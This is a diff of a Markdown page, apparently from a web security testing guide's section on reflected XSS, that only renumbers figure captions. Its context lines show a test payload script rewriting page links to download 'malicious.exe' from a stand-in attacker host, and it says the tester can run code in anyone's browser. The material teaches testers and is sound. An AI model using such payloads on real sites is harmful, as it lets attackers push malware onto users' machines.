@@ -66,7 +66,7 @@ Ideally all HTML special characters will be replaced with HTML entities. The key
 For example, consider a site that has a welcome notice `Welcome %username%` and a download link.
 
 ![XSS Example 1](images/XSS_Example1.png)\
-*Figure 4.8.1-1: XSS Example 1*
+*Figure 4.7.1-1: XSS Example 1*
 
 The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.
 
@@ -77,7 +77,7 @@ Let's try to click on the following link and see what happens:
 If no sanitization is applied this will result in the following popup:
 
 ![Alert](images/Alert.png)\
-*Figure 4.8.1-2: XSS Example 1*
+*Figure 4.7.1-2: XSS Example 1*
 
 This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if he clicks on the tester's link.
 
@@ -93,7 +93,7 @@ AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
 This produces the following behavior:
 
 ![XSS Example 2](images/XSS_Example2.png)\
-*Figure 4.8.1-3: XSS Example 2*
+*Figure 4.7.1-3: XSS Example 2*
 
 This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.
 
